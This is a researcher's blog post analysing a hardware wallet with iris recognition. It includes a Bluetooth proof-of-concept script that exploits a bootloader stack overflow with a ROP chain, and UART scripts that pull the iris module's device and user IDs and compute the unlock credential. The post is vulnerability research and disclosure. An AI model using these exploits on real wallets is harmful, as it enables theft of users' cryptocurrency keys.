---
layout: post
title: "Bootloader to Iris: A Security Teardown of a Hardware Wallet"
lang: en
category: en
post_id: iris-wallet-security-2025-en
---

Recently, I got my hands on a hardware wallet that features iris recognition as a selling point. The novelty of the iris component sparked my curiosity, so I decided to take a deep dive into its implementation. Since the wallet's hardware and software design heavily borrows from the OneKey Touch—which itself is a fork of the well-known Trezor hardware wallet—much of the logic could be cross-referenced with available source code.

### Hardware Architecture Overview

After opening up the wallet, its internal hardware layout is as follows:

![Core Chips and Hardware Layout]({{ "/assets/images/iris-wallet/1.jpg" | relative_url }})

It is primarily composed of three main parts:

An `STM32H7` serves as the MCU, responsible for user interaction, such as controlling the screen and handling button inputs. A `THD89` from Tsinghua Unigroup Microelectronics is used as the Secure Element. It's responsible for critical tasks like screen lock verification and the encrypted storage and management of cryptographic keys. Iris Recognition Module is the wallet's standout feature, driven by an independent Rockchip `RV1106` chip, forming a relatively self-contained subsystem.

The mention of Rockchip sent me down memory lane to about a decade ago when "TV sticks" first appeared. You could plug one into your TV's HDMI port to get an Android system running, a predecessor to many of today's TV boxes. Back then, these TV sticks could run either Android or Linux and were quite popular in the geek communities. Today, Rockchip has long mastered audio-visual processing and even integrates NPUs for AI, making tasks like face or iris recognition easy to implement. The iris module itself is a separate small PCB, equipped with the Rockchip chip, independent storage, and runs a trimmed-down version of Android.

**Connectivity Between Modules:**

  * **MCU to External:** Communication is primarily handled via **Bluetooth**. Although a USB port is present, its data transfer capabilities have been disabled.
  * **MCU to Secure Element:** Connected via several GPIO pins using a proprietary protocol.
  * **MCU to Iris Recognition Module:** Also connected via GPIO, but using the standard **UART protocol**.

In my analysis of this wallet, I discovered two critical security vulnerabilities:

  * **A stack overflow in the Bootloader** which, surprisingly, is fully exploitable to achieve arbitrary code execution and take over the boot chain.
  * **A logical flaw in the iris recognition module**, allowing an attacker to bypass iris verification entirely and directly calculate the unlocking credential.

Next, we'll dive into these two interesting issues one by one.

---

### The Bootloader Stack Overflow

The Bootloader has two operating modes: normal user mode (`bootloader_usb_loop`) and factory mode (`bootloader_usb_loop_factory`). Reverse-engineering the bootloader code reveals that it's mostly derived from OneKey Touch. In OneKey's design, sensitive interfaces for initialization, like writing certificates to the Secure Element (SE), are **exposed only in factory mode**.

```c
// OneKey: Normal user mode message loop, does not include WriteSEPublicCert
secbool bootloader_usb_loop(...) {
  switch (msg_id) {
    // ...
    // No handlers for SE certificate writing
    // ...
  }
}

// OneKey: Factory mode message loop, includes WriteSEPublicCert
secbool bootloader_usb_loop_factory(...) {
  switch (msg_id) {
    // ...
    case MSG_NAME_TO_ID(WriteSEPublicCert):
      process_msg_WriteSEPublicCert(USB_IFACE_NUM, msg_size, buf);
      break;
    // ...
  }
}
````

However, in the wallet I analyzed, the sensitive `process_msg_WriteSEPublicCert` operation, which should be confined to factory mode, was placed in the **normal user's Bootloader message loop**.

```c
// Iris Wallet: Decompiled bootloader_usb_loop
int __fastcall bootloader_usb_loop(int vhdr, int hdr) 
{
  // ...
  switch ( msg_id )
  {
    case 10004u: process_msg_ReadSEPublicKey(0, msg_size, (int)buf); break;
    case 10006u: process_msg_WriteSEPublicCert(0, msg_size, (int)buf); break; // Vulnerable call exposed
    case 10007u: process_msg_ReadSEPublicCert(0, msg_size, (int)buf); break;
    case 10012u: process_msg_SESignMessage(0, msg_size, (int)buf); break;
    default: goto LABEL_17;
  }
  // ...
}
```

This doesn't mean you can just grab a production wallet and modify the SE certificate, as the SE firmware still performs its own status checks. However, this finding suggested some funky modifications by the manufacturer, so I decided to dig deeper.

The message handler function parameters in the bootloader are defined via the Protobuf format. By comparing the OneKey source code with the iris wallet's decompiled code, it was clear that the parameter size for `process_msg_WriteSEPublicCert` had changed.

**OneKey:**

```c
// Handles the message by receiving it and calling the underlying SE function
void process_msg_WriteSEPublicCert(uint8_t iface_num, uint32_t msg_size, uint8_t *buf) {
  MSG_RECV_INIT(WriteSEPublicCert);
  MSG_RECV(WriteSEPublicCert);

  if (se_write_certificate(msg_recv.public_cert.bytes,
                            msg_recv.public_cert.size)) {
    send_success(iface_num, "Write certificate success");
  } else {
    send_failure(iface_num, FailureType_Failure_ProcessError,
                  "Write certificate Failed");
  }
}
```

**Iris Wallet** allocates a much larger space on the stack for `msg_recv`:

```c
// Decompiled result from the iris wallet
int __fastcall process_msg_WriteSEPublicCert(int iface_num, int msg_size, int buf)
{
  int result; // r0
  WriteSEPublicCert msg_recv; // [sp+8h] [bp-820h] BYREF
  // ...
  recv_msg(iface_num, msg_size, buf, &off_805D1DC, &msg_recv);
  if ( se_write_certificate(msg_recv.public_cert_bytes, (unsigned __int16)msg_recv.public_cert_size) )
    result = send_failure(iface_num, 9, "Write certificate Failed");
  else
    result = send_success(iface_num, "Write certificate success");
  // ...
  return result;
}
```

From this, one can infer that the parameter `WriteSEPublicCert_public_cert_t` was changed from `PB_BYTES_ARRAY_T(416)` to `PB_BYTES_ARRAY_T(2048)`. The problem is that the underlying driver was not updated to reflect this change.

**OneKey's Secure Element Driver:**

```c
// OneKey's implementation is safe
bool se_write_certificate(const uint8_t *cert, uint32_t cert_len) {
  // Delegates to a lower-level driver that writes in chunks,
  // avoiding a large stack buffer.
  return atca_write_certificate(cert, cert_len);
}
```

**Iris Wallet's Driver Implementation:**

```c
// The iris wallet's vulnerable implementation
BOOL __fastcall se_write_certificate(char *cert, int cert_len)
{
    // ...
    _BYTE command[1024];
    int cookie;
    // ...
    memcpy_reg((int)&command[3], cert, cert_len); // cert_len can be up to 2048
    response_set_length(command, cert_len);
    cmd_size = command_size(command);
    v5 = thd89_execute_command(command, cmd_size, response, 16, &response_size);
    // ...
}
```

The iris wallet's driver uses a **1024-byte** buffer but `memcpy_reg` is able to copy up to **2048 bytes** into it, creating a classic stack overflow vulnerability. Normally, such vulnerabilities are ancient history, as the Stack Cookie mechanism can easily prevent exploitation. But here's the kicker: I noticed that the firmware code only contained reads from the cookie (LDR), never writes to it (STR). In other words, it was never initialized. A comparison with the `reset_handler` confirmed that the cookie initialization part had been removed.

**OneKey:**

```armasm
reset_handler:
  ; ...

  ; copy data in from flash
  ldr r0, =data_vma     ; dst addr
  ldr r1, =data_lma     // src addr
  ldr r2, =data_size    // size in bytes
  bl memcpy

  ; <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
  ; setup the stack protector with an unpredictable value
  bl rng_get
  ldr r1, = __stack_chk_guard
  str r0, [r1]
  ; <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

  ; re-enable exceptions
  cpsie f

  ; enter the application code
  bl main

  b shutdown_privileged
```

**Iris Wallet:**
```armasm
; reset_handler
08028E30     LDR      R0, =unk_20000000
08028E32     LDR      R1, =unk_805E400
08028E34     LDR      R2, =0x200
08028E36     BL       memcpy_reg
; <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
;
;     Stack Cookie Setup Code is missing
;
; <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
08028E3A     CPSIE    F
08028E3C     BL       main
08028E40     B.W      shutdown_priviledged
```

The code that should have initialized the Stack Cookie between the memory copy (`memcpy_reg`) and enabling interrupts (`CPSIE F`) is gone. As a result, the cookie's value remains stuck at its default of 0, rendering the stack protection useless. My guess is that during debugging, they fed it a certificate of exactly 1024 bytes, forgetting that the first 3 bytes of the `command` buffer are for the header. This caused an 3 bytes overflow that corrupted the cookie and crashed the device. The person "fixing" it likely just commented out the cookie initialization, found that the code now ran (probably because the last three bytes of the certificate happened to be 0), and left this vulnerability behind.

Even in an embedded environment, the STM32 has memory protection via the hardware MPU. The bootloader's early-stage code configures memory regions with read/write/execute attributes:

```c
// The bootloader configures the MPU at startup
int __fastcall mpu_config_bootloader(...)
{
  HAL_MPU_Disable();
  // ... configure regions ...
  HAL_MPU_ConfigRegion(&MPU_InitStruct);
  // ...
  result = HAL_MPU_Enable(4);
  // ...
}
```

But an environment without randomization is a fertile ground for ROP. We can use a perfect gadget that it provides itself: `HAL_MPU_Disable`, to first turn off MPU protection and then jump to execute shellcode on the stack.

```armasm
; HAL_MPU_Disable function disassembly
0802E7CC HAL_MPU_Disable
0802E7CC     PUSH    {R0-R2,LR}
             ; ...
0802E7D4     MOV.W   R3, #0
             ; ... function body that disables the MPU ...
0802E7FE     ADD     SP, SP, #0xC
0802E800     POP.W   {PC}
```

```python
# PoC Snippet
async def main():
    # ... (Device discovery and connection) ...
    async with TouchBLE(device.address) as touch:
        await touch.send(messages.Initialize())

        shellcode_addr = 0x2001XXXX
        gadget_addr = 0x0802E7D4 + 1 # Address in Thumb mode

        payload = b"A" * (1024 - 3)
        # stack_cookie
        payload += struct.pack("<I", 0)
        # Padding and R4-R7
        payload += b"B" * 20
        # Overwrite the return address to point to our gadget
        payload += struct.pack("<I", gadget_addr)
        # 12 bytes of padding to compensate for "ADD SP, SP, #0xC" in the gadget
        payload += b"C" * 12
        # The address the gadget will pop into PC, pointing to our shellcode
        payload += struct.pack("<I", shellcode_addr)
        
        shellcode = b"\xDE\xAD\xBE\xEF..."

        final_payload = bytearray(payload)
        final_payload[0:len(shellcode)] = shellcode 

        msg = WriteSEPublicCert(public_cert=bytes(final_payload))
        msg_type, response_payload = await touch.send(msg)
```

<details markdown="block">
<summary>Full PoC Script for the Bluetooth Exploit</summary>

```python
import asyncio
import struct
from bleak import BleakClient, BleakScanner
from trezorlib import messages, protobuf
from io import BytesIO

SERVICE_UUID = "00000001-0000-1000-8000-00805f9b34fb"
WRITE_UUID   = "00000002-0000-1000-8000-00805f9b34fb"
NOTIFY_UUID  = "00000003-0000-1000-8000-00805f9b34fb"

FRAME_HEAD   = b"\x23\x23"
FRAME_PREFIX = 0x3F
CHUNK_SIZE   = 63

class TouchBLE:
    def __init__(self, address):
        self.address = address
        self.client = BleakClient(address)
        self.queue = asyncio.Queue()
        self.buffer = bytearray()
        self.expected_len = None

    async def __aenter__(self):
        await self.client.connect()
        await self.client.start_notify(NOTIFY_UUID, self._notify_handler)
        return self

    async def __aexit__(self, exc_type, exc, tb):
        await self.client.disconnect()

    def _notify_handler(self, _, data: bytearray):
        if not data: return
        if data[0] != FRAME_PREFIX:
            self.buffer.extend(data)
        else:
            chunk = data[1:]
            if chunk.startswith(FRAME_HEAD):
                self.buffer = bytearray(chunk)
                if len(self.buffer) >= 8:
                    self.expected_len = struct.unpack(">I", self.buffer[4:8])[0]
            else:
                 self.buffer.extend(chunk)
        if self.expected_len is not None and len(self.buffer) - 8 >= self.expected_len:
            msg_type = struct.unpack(">H", self.buffer[2:4])[0]
            payload = bytes(self.buffer[8 : 8 + self.expected_len])
            self.queue.put_nowait((msg_type, payload))
            self.buffer.clear()
            self.expected_len = None

    async def send(self, msg):
        buf = BytesIO()
        protobuf.dump_message(buf, msg)
        payload = buf.getvalue()
        msg_type = msg.MESSAGE_WIRE_TYPE
        header = struct.pack(">2sHI", FRAME_HEAD, msg_type, len(payload))
        frame = header + payload
        for i in range(0, len(frame), CHUNK_SIZE):
            chunk = frame[i : i + CHUNK_SIZE]
            await self.client.write_gatt_char(WRITE_UUID, bytes([FRAME_PREFIX]) + chunk, response=False)
            await asyncio.sleep(0.02)
        return await self.queue.get()

class WriteSEPublicCert(protobuf.MessageType):
    MESSAGE_WIRE_TYPE = 10006
    FIELDS = {1: protobuf.Field("public_cert", "bytes")}
    def __init__(self, *, public_cert) -> None:
        self.public_cert = public_cert

async def main():
    device = await BleakScanner.find_device_by_filter(
        lambda d, ad: SERVICE_UUID in ad.service_uuids
    )
    if not device: return

    async with TouchBLE(device.address) as touch:
        await touch.send(messages.Initialize())
        shellcode_addr = 0x20010000
        gadget_addr = 0x0802E7D4 + 1
        
        payload = bytearray()
        shellcode = b"\xDE\xAD\xBE\xEF"
        
        padding_len = 1024 - 3 - (4 + 20 + 4 + 12 + 4)
        payload.extend(shellcode)
        payload.extend(b"A" * (padding_len - len(shellcode)))
        
        payload.extend(struct.pack("<I", 0))
        payload.extend(b"B" * 20)
        payload.extend(struct.pack("<I", gadget_addr))
        payload.extend(b"C" * 12)
        payload.extend(struct.pack("<I", shellcode_addr))
        
        msg = WriteSEPublicCert(public_cert=bytes(payload))
        await touch.send(msg)

if __name__ == "__main__":
    asyncio.run(main())
```

</details>

-----

### Logical Flaws in Iris Recognition

On a mobile phone, the lock screen passcode is the critical credential. It's typically verified by a `gatekeeper`, which then produces a token for the `keymaster` to decrypt the storage. Biometrics are merely a secondary convenience, used to verify a temporary credential to quickly unlock the screen after the storage has already been decrypted. In this hardware wallet, however, iris recognition and the PIN code have equal standing and can be used independently. The logic is roughly as follows:

```python
async def verify_protection(...) -> None: 
    # ...
    while True:
        protection = bytearray()
        # ...
        if protect_type & DEVICE_PROTECT_TYPE_IRIS:
            iris_data = await request_iris_match(ctx)

        if protect_type & DEVICE_PROTECT_TYPE_PIN:
            pin = await request_pin(ctx, i18n.Title.enter_pin)

        if protect_type & DEVICE_PROTECT_TYPE_PIN:
            protection.extend(pin.encode())
        if protect_type & DEVICE_PROTECT_TYPE_IRIS:
            protection.extend(iris_data)

        if config.unlock(protection, salt):
        # ...
```

Upon successful iris recognition, a 32-byte "password" is sent to the MCU for unlocking, serving the exact same function as the PIN. This makes using only iris recognition seem like the optimal choice—it's more convenient than typing a PIN and, on the surface, appears more secure due to its complexity. However, this is not the case.

To analyze the iris module, we first need to unpack its firmware. For the Rockchip platform, there are a few tools that I've tried and found to be working and still maintained:

  * `apftool-rs` ([https://github.com/suyulin/apftool-rs](https://github.com/suyulin/apftool-rs)) can unpack the outermost firmware package.
  * `dumpimage` from the `u-boot-tools` suite can unpack `boot.img`.
  * `rsce-go` ([https://github.com/Evsio0n/rsce-go](https://github.com/Evsio0n/rsce-go)) can unpack certain resource configuration files.

After unpacking, it turns out the Rockchip module is a whole new world of its own—basically a full Android environment with a TEE, communicating with the MCU via UART. Its core logic is handled by a user-space process, `iris_face_service`, which processes messages from the UART:

```c
// Message dispatcher in iris_face_service
int SnProcessor_V2::process(...)
{
  switch ( msg_id - 1 )
  {
    case 0u: // MSG_ID_REGIST (0x01)
      SnProcessor_V2::process_regist(...); break;
    case 3u: // MSG_ID_MATCH (0x04)
      SnProcessor_V2::process_match(...); break;
    case 5u: // MSG_ID_USER_GET_ALL (0x06)
      SnProcessor_V2::process_user_get_all(...); break;
    case 11u: // MSG_ID_DEVICE_GET_SERIAL_CODE (0x0C)
      SnProcessor_V2::process_get_serial_code(...); break;
    // ... (and many other cases)
  }
}
```

From the wallet firmware's perspective, it only seems to use the register, match, and clear data interfaces. But from the iris module's side, it supports over a dozen commands, including `USER_GET_ALL` and `DEVICE_GET_SERIAL_CODE`.

Under normal circumstances, when `MATCH` or `REGIST` succeed, they both call the same `UserResponseMessage::write_virtual` function to construct the response packet for the MCU. This function contains the 32-byte hash generation process:

```c
// This function generates the response hash
bool UserResponseMessage::write_virtual(status *a1, SnProtocol_V2 *a2)
{
  unsigned __int8 hash[48];
  // Call usr_id_hash32 to generate a hash from the uid
  usr_id_hash32((unsigned __int16)a1->uid, hash);
  // Write the 32-byte hash into the response packet
  return a2->vptr->write_buf(a2, hash, 32) == 32;
}

// The core hash calculation function
int usr_id_hash32(unsigned int ID, unsigned __int8 *output)
{
  char seed[4];
  char label[32];
  *(_DWORD *)seed = ID;
  strcpy(label, "IrisUserIdLabel");
  device_id = DeviceInfo::get_device_id(instance);
  return tls_prf_sha256(device_id, 0x10u, label, 0x10u, seed, 4u, output, 0x20u);
}
```

This means the returned hash has **nothing to do with the user's biometric data**. It is determined entirely by the `DeviceID` and the `UserID`. The `UserID` is generated by the `ModuleServiceDefault::regist` function during enrollment; it's a random 2-byte integer constrained to the range of 1000 to 65535:

```c
// UserID generation during registration
int ModuleServiceDefault::regist(..., int id, ...)
{
  if ( id <= 0 ) // This is the branch the MCU calls
  {
    do {
      rk_get_random(&_uid_random, 2u);
      uid = _uid_random;
      if ( uid < 1000 )
        LOWORD(uid) = uid + 1000;
      _uid_random = (unsigned __int16)uid;
    } while ( !database->vptr->get_user_status(database) ); // Check if ID already exists
  }
}
```

So even though the hash used as a password is 32 bytes long, its true entropy is far less than that of a **6-digit PIN**. Worse still, we can directly request all `UserID`s and the `DeviceID` via the UART by sending `MSG_ID_USER_GET_ALL` and `MSG_ID_DEVICE_GET_SERIAL_CODE`. This makes our attack path incredibly simple. First, we physically disassemble the wallet and separate the small iris module PCB. As shown below, we connect the module's UART to a PC using an FPC breakout board and an FT232 USB-to-serial converter.

![Communicating with the iris module via UART]({{ "/assets/images/iris-wallet/2.jpg" | relative_url }})

Then, we run the following Python script to obtain the `UserID` and `DeviceID`.

```python
import serial
import time
import binascii
import struct

SERIAL_PORT = '/dev/ttyUSB0'
BAUDRATE = 115200

PACKET_HEADER = b'\xfe\xfd'
MSG_TYPE_REQUEST = 0x00
MSG_ID_USER_GET_ID_ALL = 0x06
MSG_ID_DEVICE_GET_SERIAL_CODE = 0x0C

def calculate_xor_crc(data: bytes) -> int:
    crc = 0
    for byte in data:
        crc ^= byte
    return crc

def build_request_packet(msg_id: int, payload: bytes = b"") -> bytes:
    msg_id_byte = msg_id.to_bytes(1, 'little')
    msg_type_byte = MSG_TYPE_REQUEST.to_bytes(1, 'little')
    payload_len_bytes = len(payload).to_bytes(2, 'little')
    message_body = msg_id_byte + msg_type_byte + payload_len_bytes + payload
    crc_byte = calculate_xor_crc(message_body).to_bytes(1, 'little')
    return PACKET_HEADER + message_body + crc_byte

if __name__ == "__main__":
    ser = serial.Serial(SERIAL_PORT, BAUDRATE, timeout=10)
    
    serial_packet = build_request_packet(MSG_ID_DEVICE_GET_SERIAL_CODE)
    ser.write(serial_packet)
    time.sleep(1)
    response_serial = ser.read(128)
    device_id = response_serial[7:-1]
    print(f"[+] Device ID: {binascii.hexlify(device_id).decode()}")

    uid_packet = build_request_packet(MSG_ID_USER_GET_ID_ALL)
    ser.write(uid_packet)
    time.sleep(1)
    response_uid = ser.read(128)
    user_id_bytes = response_uid[9:11]
    user_id = struct.unpack("<H", user_id_bytes)[0]
    print(f"[+] User ID: 0x{user_id:04x}")
```

Afterward, we can use the following script to calculate the true "unlock password":

```python
import hmac
import hashlib
import binascii
import struct

def p_sha256(secret, seed, length):
    output = b''
    a = hmac.new(secret, seed, hashlib.sha256).digest()
    while len(output) < length:
        output += hmac.new(secret, a + seed, hashlib.sha256).digest()
        a = hmac.new(secret, a, hashlib.sha256).digest()
    return output[:length]

def tls_prf_sha256(secret, label, seed, length):
    combined_seed = label + seed
    return p_sha256(secret, combined_seed, length)

serialnum = b'...' # Get from the previous step
uid = 0x...       # Get from the previous step

device_id = binascii.unhexlify(serialnum)[:16]
seed_id = struct.pack('<I', uid)
label_bytes = b"IrisUserIdLabel\x00"

final_hash = tls_prf_sha256(device_id, label_bytes, seed_id, 32)
print(final_hash.hex())
```

Finally, we connect our PC's UART to the wallet's mainboard and send the calculated `final_hash` during the iris verification prompt, which completely unlocks the device. By combining both vulnerabilities, we can achieve this without disassembling the device: use the bootloader code execution to send messages to the iris module, retrieve the credential, communicate with the secure element to get the key, and unlock the encrypted storage to obtain the wallet's mnemonic phrase.

-----

### Conclusion

When a complex product is developed by multiple teams (e.g., wallet developers vs. driver/module providers), information gaps and integration errors can easily occur. The main MCU developers might only know that “calling the iris module returns a 32-byte password” and naturally assume it’s a high-security biometric value, unaware that its entropy is extremely low and its inputs are easily obtainable. 

The iris module developers might only have been asked to “return a hash upon successful recognition,” without knowing this hash would be used as the sole, highest-privilege unlocking credential. If they thought it was just one factor in a multi-factor authentication scheme, designing such a low-entropy system might seem understandable. From the wallet firmware’s perspective, only a few interfaces like register, match, and delete are exposed, but the iris module itself offers a wide array of interfaces, including those to get all user IDs and the serial number, of which the wallet developers were likely unaware. Then there’s the bootloader, which only knows to pass a certificate to the SE driver, oblivious to the buffer mismatch between the driver and the upper-level Protobuf definition. 

Secure elements and independent biometric modules are not silver bullets; a cohesive, integrated design is. Ultimately, these seemingly isolated oversights chain together, leading to the collapse of the entire wallet’s security architecture. For devices like hardware wallets that demand the highest level of security, any single weak link can become the ant hole that collapses the thousand-mile dam.